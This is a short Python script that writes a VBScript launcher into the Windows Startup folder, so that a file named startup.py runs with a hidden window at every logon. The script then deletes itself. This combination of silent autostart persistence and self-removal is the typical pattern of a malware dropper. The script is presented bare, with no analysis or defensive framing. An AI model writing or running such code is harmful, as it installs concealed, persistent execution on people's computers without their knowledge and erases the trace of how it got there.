import shutil
import getpass
import os, time

current_folder = os.getcwd()

username = getpass.getuser()
file_name = "startup.vbs"

with open(file_name, 'w') as f:
    f.write('Set objShell = CreateObject("WScript.Shell")\n')
    f.write('objShell.Run "cmd /c python {}\startup.py", 0, False\n'.format(current_folder))
    f.write('Set objShell = Nothing')

# move the file from source to destination
src_file = f"{current_folder}\{file_name}"
dst_folder = r"C:\Users"+r"/"+username+r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
shutil.move(src_file, dst_folder)
time.sleep(0.5)
os.remove(__file__)